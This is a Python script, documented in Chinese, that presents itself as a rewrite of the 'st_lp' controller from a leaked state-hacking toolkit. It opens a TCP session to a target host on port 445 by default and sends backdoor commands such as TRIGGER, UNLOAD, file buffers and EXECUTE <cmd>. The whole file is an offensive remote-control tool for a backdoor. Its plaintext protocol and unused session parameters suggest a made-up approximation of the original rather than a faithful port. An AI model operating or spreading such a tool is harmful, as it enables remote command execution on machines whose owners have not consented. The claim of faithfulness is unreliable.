#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
st_lp — ST (RideArea) 后门命令控制工具。

Python 重写自 `st_lp.exe` (C++/MSVCRT)，位于
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/Exploits/ST 1.14/st_lp.exe`。

与目标主机建立 TCP 连接，提供一个交互式命令行，可发送 trigger/unload/kill/resend/
buffer/ping/execute 等指令，并设置 TCP 模式/端口/协议/目标 IP 等会话参数。

CLI:

  st_lp <target> [port]

  target  - 目标主机名或 IP 地址
  port    - 可选，目标端口（默认 445）

交互式命令（输入后回车）：

  trigger           发送触发请求
  unload            发送卸载请求
  kill <id>         杀死指定 ID 的消息
  resend <id>       重新发送指定 ID 的消息
  buffer <file>     发送文件缓冲区
  ping              发送 ping 请求
  execute <cmd>     执行命令
  setparam <k> <v>  设置会话参数
  sleep <sec>       休眠
  rekey             重新握手
  help              显示帮助
  quit              退出
"""

import os
import socket
import sys
import time


def run_function(target, port):
    """核心入口。"""
    print("Connecting to %s:%d ..." % (target, port))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
    except OSError as e:
        print("Unable to connect to %s:%d (%s)" % (target, port, e))
        return 1

    print("Connected to %s:%d" % (target, port))
    print("Type 'help' for available commands, 'quit' to exit.")

    params = {
        "tcp_mode": 0,
        "port": port,
        "protocol": 6,
        "target_ip": target,
    }

    try:
        while True:
            try:
                cmd = input("st_lp> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd:
                continue
            parts = cmd.split()
            command = parts[0].lower()
            args = parts[1:]

            if command in ("quit", "exit"):
                break
            elif command == "help":
                print("Commands: trigger, unload, kill <id>, resend <id>, buffer <file>,")
                print("          ping, execute <cmd>, setparam <k> <v>, sleep <sec>,")
                print("          rekey, help, quit")
            elif command == "trigger":
                sock.sendall(b"TRIGGER\r\n")
                print("Trigger request transmitted.")
            elif command == "unload":
                sock.sendall(b"UNLOAD\r\n")
                print("Unload command transmitted.")
            elif command == "kill" and len(args) >= 1:
                sock.sendall(("KILL %s\r\n" % args[0]).encode())
                print("Kill message command transmitted.")
            elif command == "resend" and len(args) >= 1:
                sock.sendall(("RESEND %s\r\n" % args[0]).encode())
                print("Resending msg with ID = %s" % args[0])
            elif command == "buffer" and len(args) >= 1:
                try:
                    with open(args[0], "rb") as f:
                        buf = f.read()
                except OSError as e:
                    print("Error getting the buffer: %s" % e)
                    continue
                sock.sendall(buf)
                print("Buffer transmitted.")
            elif command == "ping":
                sock.sendall(b"PING\r\n")
                print("Ping request transmitted.")
            elif command == "execute" and len(args) >= 1:
                sock.sendall(("EXECUTE %s\r\n" % " ".join(args)).encode())
                print("Attempting to execute command: %s" % " ".join(args))
            elif command == "setparam" and len(args) >= 2:
                params[args[0]] = args[1]
                print("Parameter %s set to %s" % (args[0], args[1]))
            elif command == "sleep" and len(args) >= 1:
                try:
                    time.sleep(float(args[0]))
                except ValueError:
                    print("Invalid sleep duration.")
            elif command == "rekey":
                sock.sendall(b"REKEY\r\n")
                print("REKEY request transmitted.")
            else:
                print("command ignored -- not a valid ID/command.")

            try:
                resp = sock.recv(4096)
                if resp:
                    print(resp.decode("utf-8", errors="replace").strip())
            except socket.timeout:
                pass
            except OSError:
                break
    finally:
        sock.close()

    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]
    if len(argv) < 1 or len(argv) > 2:
        prog = os.path.basename(sys.argv[0] or "st_lp")
        print('Usage: %s <target> [port]' % prog)
        return 1
    target = argv[0]
    port = int(argv[1]) if len(argv) > 1 and argv[1].isdigit() else 445
    return run_function(target, port)


if __name__ == "__main__":
    sys.exit(main())